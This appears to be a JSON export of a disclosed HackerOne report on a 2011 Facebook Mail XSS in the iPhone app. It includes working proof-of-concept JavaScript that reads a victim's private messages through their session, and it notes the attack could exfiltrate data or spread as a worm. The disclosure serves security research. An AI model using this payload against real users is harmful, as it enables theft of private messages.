{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": true, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": null, 
    "voters": [
        "jokebookservice1", 
        "ziot", 
        "jobert", 
        "stefanofinding", 
        "michiel", 
        "z3t", 
        "spam404", 
        "shailesh4594", 
        "ramsexy", 
        "teknogeek", 
        "and 76 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 390344, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "iPhone app XSS in Facebook Mail", 
    "is_member_of_team?": null, 
    "vote_count": 86, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_view?": true, 
            "can_edit?": false, 
            "id": 9700, 
            "content": "Why am I reading a 2011 vulnerability report to Facebook? Good question!\n\nThis is the very first vulnerability @jobert and I ever submitted to Facebook. This was also before the Facebook bug bounty program was even established. It was a simple XSS in Facebook Mail that was quickly triaged and resolved back in July 2011. But perhaps more importantly, this is how we met @arice and ultimately led to the founding of HackerOne in 2012! I guess you could say the rest is history\u2026.\n\nFun facts:\n* After the introduction of the Facebook bug bounty program, the committee decided to retroactively award us with $3,000 for this XSS.\n* This pre-dates widespread adoption of Content-Security Policies.\n* This also pre-dates origin sandboxing on iOS when content is served with the `Content-Disposition: attachment` header. In older versions of iOS this content would execute in the same origin.", 
            "content_html": "<p>Why am I reading a 2011 vulnerability report to Facebook? Good question!</p>\n\n<p>This is the very first vulnerability <a href=\"/jobert\">@jobert</a> and I ever submitted to Facebook. This was also before the Facebook bug bounty program was even established. It was a simple XSS in Facebook Mail that was quickly triaged and resolved back in July 2011. But perhaps more importantly, this is how we met <a href=\"/arice\">@arice</a> and ultimately led to the founding of HackerOne in 2012! I guess you could say the rest is history\u2026.</p>\n\n<p>Fun facts:</p>\n\n<ul>\n<li>After the introduction of the Facebook bug bounty program, the committee decided to retroactively award us with $3,000 for this XSS.</li>\n<li>This pre-dates widespread adoption of Content-Security Policies.</li>\n<li>This also pre-dates origin sandboxing on iOS when content is served with the <code>Content-Disposition: attachment</code> header. In older versions of iOS this content would execute in the same origin.</li>\n</ul>\n"
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "attachments": [
        {
            "file_name": "fb-mail-poc.html", 
            "type": "text/html", 
            "id": 328174, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/328/174/ffeda19be5becf5c56c7773a75aa313343cff899/fb-mail-poc.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221821Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1fe0f6cc3c5506045b9c3ce936445fae549a6960941a40cacf8b440133a54f8d"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "reporter": {
                "username": "michiel", 
                "url": "/michiel"
            }, 
            "created_at": "2011-07-28T19:59:52.000Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2011-07-28T19:59:52.000Z", 
            "actor": {
                "username": "michiel", 
                "url": "/michiel", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/007/148ca8ec6766a1b0e556fcb6202947a5084069df_medium.png?1395443047"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "facebook", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 3138696, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-08-03T20:08:45.166Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-08-03T20:08:45.166Z", 
            "actor": {
                "username": "michiel", 
                "url": "/michiel", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/007/148ca8ec6766a1b0e556fcb6202947a5084069df_medium.png?1395443047"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "facebook", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 3138697, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "michiel", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/michiel", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/007/269edb3bb231ea102c6e6ed5a4fed0965ef828d1_small.png?1395443047"
        }, 
        "is_me?": false
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2018-08-03T20:08:45.145Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/390344", 
    "created_at": "2011-07-27T19:59:52.000Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p><strong>From Alex Rice:</strong></p>\n\n<blockquote>\n<p>Hi Jobert, Michiel -</p>\n\n<p>I run the Product Security team over at Facebook. \u2588\u2588\u2588\u2588\u2588\u2588 just sent along a note mentioning that you&#39;re attempting to contact us with information on a XSS in Facebook&#39;s mail site. Can you share any additional details?</p>\n\n<p>Thanks!</p>\n</blockquote>\n\n<p><strong>Our response:</strong><br>\nDuring a recent security review we did for \u2588\u2588\u2588\u2588\u2588\u2588, we discovered a Cross-Site Scripting (XSS) issue related to how in-app iOS browsers handle the rendering of attachments. We did a quick check to see if a related vulnerability would be present at Facebook. </p>\n\n<p>We discovered the Facebook Mail feature is particularly vulnerable to this. The XSS can be used to get access to other messages in a user\u2019s inbox and can be wormified for greater impact.</p>\n\n<p>To reproduce this vulnerability, you need to send the attached file - <a href=\"#\" class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"fb-mail-poc.html\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/328/174/ffeda19be5becf5c56c7773a75aa313343cff899/fb-mail-poc.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221821Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=1fe0f6cc3c5506045b9c3ce936445fae549a6960941a40cacf8b440133a54f8d\" data-attachment-type=\"text/html\">fb-mail-poc.html (F328174)</a> - to someone\u2019s Facebook email address. This file contains the proof of concept exploit code. When the user opens the attachment via the Facebook iPhone app (might work on other mobile devices as well), the attached HTML file containing the exploit gets executed in the same origin as <a title=\"https://iphone.facebook.com\" href=\"/redirect?signature=f396b5cde6dc6f043b1ad5cc507364ead1348bfa&amp;url=https%3A%2F%2Fiphone.facebook.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://iphone.facebook.com</span><i class=\"icon-external-link\"></i></a>. In this particular proof of concept, the victim will see their private messages displayed. It would be trivial to expand the PoC to send this data to an external server, or access other private information such as the victim\u2019s photos.</p>\n\n<p>To clarify further, when opening the attachment on an iPhone via the Facebook app, the current session is used to authenticate and render the attachment in the mobile in-app browser. Because of the shared session, the browser can send AJAX calls to <a title=\"https://iphone.facebook.com\" href=\"/redirect?signature=f396b5cde6dc6f043b1ad5cc507364ead1348bfa&amp;url=https%3A%2F%2Fiphone.facebook.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://iphone.facebook.com</span><i class=\"icon-external-link\"></i></a> and retrieve content. This also bypasses the frame busting mechanism and JSON obfuscation system, as it is unnecessary to do a cross-domain attack and the retrieved <code>for (;;);</code> can be removed on-the-fly given that the XSS operates in the same origin.</p>\n\n<p>Because we&#39;re in the Bay Area now and scheduled to fly back to the Netherlands on Monday, we asked \u2588\u2588\u2588\u2588\u2588\u2588 if they could potentially expedite things a bit and see if we could do a meeting at FB and discuss our findings.</p>\n\n<p><strong>fb-mail-poc.html:</strong></p>\n<pre class=\"highlight javascript\"><code><span class=\"o\">&lt;</span><span class=\"nx\">script</span> <span class=\"nx\">type</span><span class=\"o\">=</span><span class=\"s2\">&quot;text/javascript&quot;</span> <span class=\"nx\">src</span><span class=\"o\">=</span><span class=\"s2\">&quot;http://www.online24.nl/static/assets/js/jquery-1.4.4.min.js&quot;</span><span class=\"o\">&gt;&lt;</span><span class=\"sr\">/script</span><span class=\"err\">&gt;\n</span><span class=\"o\">&lt;</span><span class=\"nx\">script</span> <span class=\"nx\">type</span><span class=\"o\">=</span><span class=\"s2\">&quot;text/javascript&quot;</span><span class=\"o\">&gt;</span>\n    <span class=\"c1\">// http://iphone.facebook.com/photo_dashboard.php?endtime=1311780199&amp;__ajax__&amp;__metablock__=9</span>\n    <span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(){</span>\n        <span class=\"nx\">parse_messages</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">()</span>\n        <span class=\"p\">{</span>\n            <span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">&#39;.twoLines.preview&gt;.snippet&#39;</span><span class=\"p\">).</span><span class=\"nx\">each</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">index</span><span class=\"p\">,</span><span class=\"nx\">value</span><span class=\"p\">)</span>\n            <span class=\"p\">{</span>\n                <span class=\"nx\">lines</span> <span class=\"o\">=</span> <span class=\"nx\">value</span><span class=\"p\">.</span><span class=\"nx\">innerHTML</span><span class=\"p\">.</span><span class=\"nx\">replace</span><span class=\"p\">(</span><span class=\"sr\">/</span><span class=\"se\">(</span><span class=\"sr\">&lt;</span><span class=\"se\">([^</span><span class=\"sr\">&gt;</span><span class=\"se\">]</span><span class=\"sr\">+</span><span class=\"se\">)</span><span class=\"sr\">&gt;</span><span class=\"se\">)</span><span class=\"sr\">/ig</span><span class=\"p\">,</span><span class=\"s1\">&#39;&#39;</span><span class=\"p\">);</span>\n\n                <span class=\"nx\">alert</span><span class=\"p\">(</span><span class=\"nx\">lines</span><span class=\"p\">);</span>\n            <span class=\"p\">});</span>\n        <span class=\"p\">};</span>\n\n        <span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">ajax</span><span class=\"p\">({</span>\n            <span class=\"na\">url</span><span class=\"p\">:</span><span class=\"s2\">&quot;https://iphone.facebook.com/messages/?refid=7&amp;__ajax__&amp;__m_async_page__&amp;__jewels__&amp;__metablock__=3&quot;</span><span class=\"p\">,</span>\n            <span class=\"na\">success</span><span class=\"p\">:</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">)</span>\n            <span class=\"p\">{</span>\n                <span class=\"nx\">x</span> <span class=\"o\">=</span> <span class=\"nb\">eval</span><span class=\"p\">(</span><span class=\"s1\">&#39;(&#39;</span><span class=\"o\">+</span><span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">substr</span><span class=\"p\">(</span><span class=\"mi\">9</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"s1\">&#39;)&#39;</span><span class=\"p\">);</span>\n                <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">write</span><span class=\"p\">(</span><span class=\"s1\">&#39;&lt;div style=&quot;display:none;&quot;&gt;&#39;</span><span class=\"o\">+</span><span class=\"nx\">x</span><span class=\"p\">.</span><span class=\"nx\">m</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">].</span><span class=\"nx\">html</span><span class=\"o\">+</span><span class=\"s1\">&#39;&lt;/div&gt;&#39;</span><span class=\"p\">);</span>\n\n                <span class=\"nx\">parse_messages</span><span class=\"p\">();</span>\n            <span class=\"p\">}</span>\n        <span class=\"p\">});</span>\n    <span class=\"p\">});</span>\n<span class=\"o\">&lt;</span><span class=\"sr\">/script</span><span class=\"err\">&gt;\n</span></code></pre>", 
    "vulnerability_information": "**From Alex Rice:**\n> Hi Jobert, Michiel -\n> \n> I run the Product Security team over at Facebook. \u2588\u2588\u2588\u2588\u2588\u2588 just sent along a note mentioning that you're attempting to contact us with information on a XSS in Facebook's mail site. Can you share any additional details?\n> \n> Thanks!\n\n**Our response:**\nDuring a recent security review we did for \u2588\u2588\u2588\u2588\u2588\u2588, we discovered a Cross-Site Scripting (XSS) issue related to how in-app iOS browsers handle the rendering of attachments. We did a quick check to see if a related vulnerability would be present at Facebook. \n\nWe discovered the Facebook Mail feature is particularly vulnerable to this. The XSS can be used to get access to other messages in a user\u2019s inbox and can be wormified for greater impact.\n\nTo reproduce this vulnerability, you need to send the attached file - {F328174} - to someone\u2019s Facebook email address. This file contains the proof of concept exploit code. When the user opens the attachment via the Facebook iPhone app (might work on other mobile devices as well), the attached HTML file containing the exploit gets executed in the same origin as https://iphone.facebook.com. In this particular proof of concept, the victim will see their private messages displayed. It would be trivial to expand the PoC to send this data to an external server, or access other private information such as the victim\u2019s photos.\n\nTo clarify further, when opening the attachment on an iPhone via the Facebook app, the current session is used to authenticate and render the attachment in the mobile in-app browser. Because of the shared session, the browser can send AJAX calls to https://iphone.facebook.com and retrieve content. This also bypasses the frame busting mechanism and JSON obfuscation system, as it is unnecessary to do a cross-domain attack and the retrieved `for (;;);` can be removed on-the-fly given that the XSS operates in the same origin.\n\nBecause we're in the Bay Area now and scheduled to fly back to the Netherlands on Monday, we asked \u2588\u2588\u2588\u2588\u2588\u2588 if they could potentially expedite things a bit and see if we could do a meeting at FB and discuss our findings.\n\n**fb-mail-poc.html:**\n```js\n<script type=\"text/javascript\" src=\"http://www.online24.nl/static/assets/js/jquery-1.4.4.min.js\"></script>\n<script type=\"text/javascript\">\n\t// http://iphone.facebook.com/photo_dashboard.php?endtime=1311780199&__ajax__&__metablock__=9\n\t$(function(){\n\t\tparse_messages = function()\n\t\t{\n\t\t\t$('.twoLines.preview>.snippet').each(function(index,value)\n\t\t\t{\n\t\t\t\tlines = value.innerHTML.replace(/(<([^>]+)>)/ig,'');\n\t\t\t\t\n\t\t\t\talert(lines);\n\t\t\t});\n\t\t};\n\t\t\n\t\t$.ajax({\n\t\t \turl:\"https://iphone.facebook.com/messages/?refid=7&__ajax__&__m_async_page__&__jewels__&__metablock__=3\",\n\t\t\tsuccess:function(data)\n\t\t\t{\n\t\t\t\tx = eval('('+data.substr(9)+')');\n\t\t\t\tdocument.write('<div style=\"display:none;\">'+x.m[1].html+'</div>');\n\t\t\t\t\n\t\t\t\tparse_messages();\n\t\t\t}\n\t\t});\n\t});\n</script>\n```", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.facebook.com", 
            "about": "Giving people the power to share and make the world more open and connected", 
            "twitter_handle": "facebook", 
            "name": "Facebook"
        }, 
        "handle": "facebook", 
        "url": "https://hackerone.com/facebook", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/939/8680806cfd69c65beedff564e13c5bb3d0d81189_small.?1432930233", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/939/be95e77db291d11c0397deb12734ed399b01715c_medium.?1432930233"
        }, 
        "id": 939, 
        "permissions": []
    }, 
    "is_published": true
}